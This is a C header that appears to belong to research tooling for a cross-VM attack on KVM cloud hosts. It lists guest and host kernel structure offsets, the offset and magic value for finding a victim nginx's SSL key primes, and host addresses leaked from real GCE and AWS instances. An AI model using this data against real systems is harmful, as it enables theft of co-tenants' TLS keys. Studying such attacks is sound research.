#pragma once
#include <stdint.h>
#include "config.h"
#include "helpers.h"

#include <stdint.h>

typedef uint64_t u64; // virtual address
typedef unsigned long va_t; // virtual address
typedef unsigned long pa_t; // physical address
typedef unsigned long gva_t; // guest virtual address
typedef unsigned long gpa_t; // guest physical address
typedef unsigned long hva_t; // host virtual address
typedef unsigned long hpa_t; // host physical address
typedef unsigned long pte_t; // page table entry - pfn is host physical


/******************************************************************************
 ************************  Victim Guest Kernel Layout  ************************
 ******************************************************************************/

 #define TASK_COMM_LEN 0x10

 #if MACHINE == FATHER

#define G_INIT_NAME		"swapper/"
#define G_TEXT_INIT_TASK	0x1c112c0	// struct task_struct init_task

// struct task_struct {
#define G_TASK_TASKS		0x8f0	// struct list_head tasks
#define G_TASK_MM		0x940	// struct mm_struct *mm
#define G_TASK_PID		0x9c0	// pid_t pid, tgid
#define G_TASK_PARENT		0x9d0	// struct task_struct *real_parent
#define G_TASK_CHILDREN		0x9e0	// struct list_head children
#define G_TASK_SIBLING		0x9f0	// struct list_head sibling
#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define G_TASK_COMM		0xba8	// char comm[TASK_COMM_LEN]
// };

// struct mm_struct {
#define G_MM_PGD		0x78	// pgd_t *pgd
#define G_MM_HEAP		0x158	// unsigned long start_brk
// };

#define NGINX_SSLKEY		0x8c2cf
#define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
#define SSLKEY_MAGIC		0x00818102

#elif MACHINE == GCE

#define G_INIT_NAME		"swapper/"
#define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task

// struct task_struct {
#define G_TASK_TASKS		0x890	// struct list_head tasks
#define G_TASK_MM		0x8e0	// struct mm_struct *mm
#define G_TASK_PID		0x960	// pid_t pid, tgid
#define G_TASK_PARENT		0x970	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
#define G_TASK_CHILDREN		0x980	// struct list_head children TODO THIS IS ONLY GUESS
#define G_TASK_SIBLING		0x990	// struct list_head sibling TODO THIS IS ONLY GUESS
#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
// };

// struct mm_struct {
#define G_MM_PGD		0x78	// pgd_t *pgd
#define G_MM_HEAP		0x168	// unsigned long start_brk
// };

#define NGINX_SSLKEY		0x8b99f
#define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
#define SSLKEY_MAGIC		0x00818102

#elif MACHINE == AWS

#define G_INIT_NAME		"swapper/"
#define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task

// struct task_struct {
#define G_TASK_TASKS		0x890	// struct list_head tasks
#define G_TASK_MM		0x940	// struct mm_struct *mm
#define G_TASK_PID		0x960	// pid_t pid, tgid
#define G_TASK_PARENT		0x970	// struct task_struct *real_parent
#define G_TASK_CHILDREN		0x980	// struct list_head children
#define G_TASK_SIBLING		0x990	// struct list_head sibling
#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
// };

// struct mm_struct {
#define G_MM_PGD		0x78	// pgd_t *pgd
#define G_MM_HEAP		0x158	// unsigned long start_brk
// };

#define NGINX_SSLKEY		0x8b99f
#define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
#define SSLKEY_MAGIC		0x00818102

#endif // MACHINE


/******************************************************************************
 ************************  Victim Host Kernel Layout  *************************
 ******************************************************************************/

#if MACHINE == FATHER

#define OWN_TASK_NAME		"qemu-system-x86"
#define VM_COMM                 "qemu-system-x86"

// struct kvm_apic_map {
#define H_MAP_PHYS_MAP		0x218	// struct kvm_lapic *phys_map[max_apic_id+1]
// };

// struct kvm_lapic {
#define H_LAPIC_BASE_ADDR	0x0	// u64 base_address == 0xfee00000
#define H_LAPIC_VCPU		0x90	// struct kvm_vcpu *vcpu
// };

// struct kvm_vcpu {
#define H_VCPU_KVM		0x0	// struct kvm *kvm
#define H_VCPU_PID		0x78	// struct pid *pid
#define H_VCPU_ARCH		0x120	// struct kvm_vcpu_arch arch
// };

// struct pid {
#define H_PID_TASKS		0x20	// struct hlist_head tasks[PIDTYPE_MAX] --> TASK_PID_LINKS
// };

// struct task_struct {
#define H_TASK_TASKS		0x8f0	// struct list_head tasks
#define H_TASK_MM		0x940	// struct mm_struct *mm
#define H_TASK_PID		0x9c0	// pid_t pid, tgid
#define H_TASK_PARENT		0x9d0	// struct task_struct *real_parent
#define H_TASK_CHILDREN		0x9e0	// struct list_head children
#define H_TASK_SIBLING		0x9f0	// struct list_head sibling
#define H_TASK_PID_LINKS	0xa30	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define H_TASK_COMM		0xbe0	// char comm[TASK_COMM_LEN]
#define H_TASK_FILES		0xc28   // struct files_struct *files
// };

// struct files_struct {
#define H_FILES_FDT		0x20	// struct fdtable *fdt
// };

// struct fdtable {
#define H_FDTABLE_FD		0x8	// struct file **fd
// };

// struct file {
#define H_FILE_PRIV		0x20	// void *private_data
// } __randomize_layout;

#define FD_KVM_GUESS		0xa	// At what file descriptor number do we expect the kvm file?

// struct mm_struct {
#define H_MM_PGD		0x78	// pgd_t *pgd
// };

// struct kvm_vcpu_arch {
#define H_ARCH_CR3		0xa0	// unsigned long cr3
#define H_ARCH_MMU		0x168	// struct kvm_mmu *mmu --> ARCH_ROOT_MMU
#define H_ARCH_ROOT_MMU		0x170	// struct kvm_mmu root_mmu
// }

// struct kvm_mmu {
#define H_MMU_ROOT		0x30	// struct kvm_mmu_root_info root;
// }

// struct kvm_mmu_root_info {
#define H_INFO_HPA		0x8	// hpa_t hpa;
// };

// struct kvm {
#define H_KVM_VCPU_ARRAY	0x1128	// struct xarray vcpu_array
#define H_KVM_VM_LIST		0x1178	// struct list_head vm_list
// };

// struct xarray {
#define H_XARRAY_HEAD		0x8	// void __rcu *xa_head
// };

#elif MACHINE == GCE

#define OWN_TASK_NAME		"VCPU-0"
#define VM_COMM                 "VCPU-"

// struct kvm_apic_map {
#define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
// };

// struct kvm_lapic {
#define H_LAPIC_BASE_ADDR	0x0	// u64 base_address == 0xfee00000
#define H_LAPIC_VCPU		0x98	// struct kvm_vcpu *vcpu
// };

// struct kvm_vcpu {
#define H_VCPU_KVM		0x0	// struct kvm *kvm
#define H_VCPU_PID		0x90	// struct pid *pid
#define H_VCPU_ARCH		0x138	// struct kvm_vcpu_arch arch
// };

// struct pid {
#define H_PID_TASKS		0x10	// struct hlist_head tasks[PIDTYPE_MAX] --> TASK_PID_LINKS
// };

// struct task_struct {
#define H_TASK_PRIOS		0x64	// int static_prio, normal_prio, rt_priority
#define H_TASK_TASKS		0x900	// struct list_head tasks
#define H_TASK_MM		0x950	// struct mm_struct *mm
#define H_TASK_PID		0xa08	// pid_t pid, tgid
#define H_TASK_PARENT		0xa18	// struct task_struct *real_parent
#define H_TASK_CHILDREN		0xa28	// struct list_head children
#define H_TASK_SIBLING		0xa38	// struct list_head sibling
#define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define H_TASK_COMM		0xc38	// char comm[TASK_COMM_LEN]
#define H_TASK_FILES		0xc70   // struct files_struct *files
// };

// struct files_struct {
#define H_FILES_FDT		0x20	// struct fdtable *fdt
// };

// struct fdtable {
#define H_FDTABLE_FD		0x8	// struct file **fd
// };

// struct file {
#define H_FILE_PRIV		0xc8	// void *private_data
// } __randomize_layout;

#define FD_KVM_GUESS		0x178	// At what file descriptor number do we expect the kvm file?

// struct mm_struct {
#define H_MM_PGD		0x80	// pgd_t *pgd
// };

// struct kvm_vcpu_arch {
#define H_ARCH_CR3		0xa0	// unsigned long cr3
#define H_ARCH_MMU		0x168	// struct kvm_mmu *mmu --> ARCH_ROOT_MMU
#define H_ARCH_ROOT_MMU		0x170	// struct kvm_mmu root_mmu
// }

// struct kvm_mmu {
#define H_MMU_ROOT		0x40	// struct kvm_mmu_root_info root;
// }

// struct kvm_mmu_root_info {
#define H_INFO_HPA		0x8	// hpa_t hpa;
// };

// struct kvm {
#define H_KVM_VCPU_ARRAY	0x1128	// struct xarray vcpu_array
#define H_KVM_VM_LIST		-1	// struct list_head vm_list -- doesnt seem to exist on gce
// };

// struct xarray {
#define H_XARRAY_HEAD		0x0	// actually a direct pointer to the kvm_vcpu struct
// };

#elif MACHINE == AWS

#define OWN_TASK_NAME		"dom:44959644165"
#define VM_COMM                 "dom:"

// struct kvm_apic_map {
#define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
// };

// struct kvm_lapic {
#define H_LAPIC_BASE_ADDR	0x0	// u64 base_address == 0xfee00000
#define H_LAPIC_VCPU		0x98	// struct kvm_vcpu *vcpu
// };

// struct kvm_vcpu {
#define H_VCPU_KVM		0x0	// struct kvm *kvm
#define H_VCPU_PID		0x90	// struct pid *pid
#define H_VCPU_ARCH		0x1b0	// struct kvm_vcpu_arch arch
// };

// struct pid {
#define H_PID_TASKS		0x10	// struct hlist_head tasks[PIDTYPE_MAX] --> TASK_PID_LINKS
// };

// struct task_struct {
#define H_TASK_PRIOS		0x64	// int static_prio, normal_prio, rt_priority
#define H_TASK_TASKS		0x908	// struct list_head tasks
#define H_TASK_MM		0x958	// struct mm_struct *mm
#define H_TASK_PID		0xa08	// pid_t pid, tgid
#define H_TASK_PARENT		0xa18	// struct task_struct *real_parent
#define H_TASK_CHILDREN		0xa28	// struct list_head children
#define H_TASK_SIBLING		0xa38	// struct list_head sibling
#define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define H_TASK_COMM		0xc48	// char comm[TASK_COMM_LEN]
#define H_TASK_FILES		0xc78   // struct files_struct *files
// };

// struct files_struct {
#define H_FILES_FDT		0x20	// struct fdtable *fdt
// };

// struct fdtable {
#define H_FDTABLE_FD		0x8	// struct file **fd
// };

// struct file {
#define H_FILE_PRIV		0xc0	// void *private_data
// } __randomize_layout;

#define FD_KVM_GUESS		0xa	// At what file descriptor number do we expect the kvm file?

// struct mm_struct {
#define H_MM_PGD		0x40	// pgd_t *pgd
// };

// struct kvm_vcpu_arch {
#define H_ARCH_CR3		0xa0	// unsigned long cr3
#define H_ARCH_MMU		0x168	// struct kvm_mmu *mmu --> ARCH_ROOT_MMU
#define H_ARCH_ROOT_MMU		0x170	// struct kvm_mmu root_mmu
// }

// struct kvm_mmu {
#define H_MMU_ROOT		0x38	// struct kvm_mmu_root_info root;
// }

// struct kvm_mmu_root_info {
#define H_INFO_HPA		0x8	// hpa_t hpa;
// };

// struct kvm {
#define H_KVM_VCPU_ARRAY	0x48	// struct xarray vcpu_array
#define H_KVM_VM_LIST		-1	// struct list_head vm_list -- doesnt seem to exist on aws
// };

// struct xarray {
#define H_XARRAY_HEAD		0x8	// void __rcu *xa_head
// };

#endif // MACHINE


/******************************************************************************
 ************************  Previously Leaked Results  *************************
 ******************************************************************************/

#if LEAK == SKIP || HELPERS

#if MACHINE == FATHER

#define BASE		0x2e5046218UL
#define HOST_DIRECT_MAP	0xffffa03300000000
#define OWN_VCPU	0xffffa03509eea300
#define OWN_TASK	0xffffa034016c0000
#define HCR3		0x587fa6000UL
#define OWN_KVM		0xffffb1b08d9f5000
#define VICTIM_TASK	0xffff929245ad4100
#define VICTIM_KVM	0xffffb1b08ef31000
#define VICTIM_VCPU	0xffffa03509694600
#define EPTP		0x19b9f2000UL
#define GCR3		0x295b40000UL
#define GTEXT		0xffffffffb3400000
#define INIT_COMM	0x34f211e68UL
#define NGINX		0xffff929245ad4100

#elif MACHINE == GCE

// ---------[ rain-vm-gce ]---------
#define BASE		0x11f73d218UL
// #define HOST_DIRECT_MAP	0xffff934040000000
// #define OWN_VCPU	0xffff934153430e80
// #define OWN_KVM         0xffff9584f57c7000
// #define OWN_TASK	0xffff936fa3088040
// #define HCR3		0x111cf6000UL
// #define VICTIM_TASK	0xffff935f6acfe140
// #define VICTIM_VCPU	0xffff93479fb210c0
// #define EPTP		0x88030b000UL
// #define GCR3		0x3adfb1e000UL
// #define GTEXT		0xffffffff90600000
// #define GDM		0xffff919200000000
// #define NGINX		0xffff91930087af40
// #define NGINX_CR3	0x117e010000UL
// #define SSLKEY_HPA      0x16ff0999fUL
// ---------[ old (pre-reboot) rain-vm-gce ]---------
// #define BASE		0x88d43f218UL
// #define HOST_DIRECT_MAP	0xffff934040000000
// #define OWN_VCPU	0xffff9352eff70e40 // 0xffff934153430e80
// #define OWN_TASK	0xffff936a91dba000
// #define HCR3		0x111cf6000UL
// #define OWN_KVM		0xffff9584f2d71000
// ---------[ rain-vm-gce-victim ]---------
// #define BASE		0x257d33218UL
// #define HOST_DIRECT_MAP	0xffff934040000000
// #define OWN_VCPU	0xffff934214b80f40 // 0xffff9341654b0f80
// #define OWN_TASK	0xffff9341645e2040 // 0xffff93416f4041c0
// #define HCR3		0x13373c000UL
// #define OWN_KVM		0xffff9584f96ad000
// ---------[ rain-vm-gce-test ]---------
// #define BASE		0x305c25a218UL
// #define HOST_DIRECT_MAP 0xffff934040000000
// #define OWN_VCPU	0xffff93a118800bc0
// #define OWN_TASK	0xffff93a173d86140
// #define HCR3		0x72ecfa2000UL
// #define VICTIM_TASK     0xffff935f6acfe140 // gce-victim's VCPU-0

#elif MACHINE == AWS

// #define BASE		0xa1d35218UL
// #define HOST_DIRECT_MAP	0xffff93e3c0000000
// #define OWN_VCPU	0xffff93e461290000
// #define OWN_TASK	0xffff93f671ad4ce0
// #define HCR3		0xa1278000UL
// #define OWN_KVM	        0xffffab3801795000
// --------[ rain-vm-aws-c5-extra ]----------
// #define BASE		0x9e39e218UL
// #define HOST_DIRECT_MAP	0xffff9868c0000000
// #define OWN_VCPU	0xffff98695f2137c0
// #define OWN_TASK	0xffff98695f1eb2a0
// #define HCR3		0x9e154000UL
// #define VICTIM_TASK	0xffff987b61afb2a0
// #define VICTIM_VCPU	0xffff98695f2137c0 // 0xffff98695f20b7c0 // 0xffff98695f1f0000
// #define EPTP		0x9f333000UL // 0x9f35f000UL
// #define GCR3		0xa3668e000UL // ?
// #define VICTIM_VCPU	0x
// // --------[ rain-vm-aws-c5-extra-old ]----------
// #define BASE		0x9b223218UL
// #define HOST_DIRECT_MAP	0xffff93e3c0000000
// #define OWN_VCPU	0xffff93e3e5580000
// #define OWN_TASK	0xffff93e461911860 // ?

#endif // MACHINE

#elif LEAK == CHEAT || LEAK == CHEAT_NOISY

#define BASE (helper_base_pa())
#define HOST_DIRECT_MAP (hc_direct_map())

#endif // LEAK


void get_feeling_for_kernel_kvm_data_structures(void);
void reverse_host_kernel_data_structures_aws(void);
void reverse_host_kernel_data_structures(void);
void reverse_around(hpa_t base, hpa_t pa);
void reverse_after(hpa_t base, hpa_t pa, hva_t hdm, const char *name, int len);
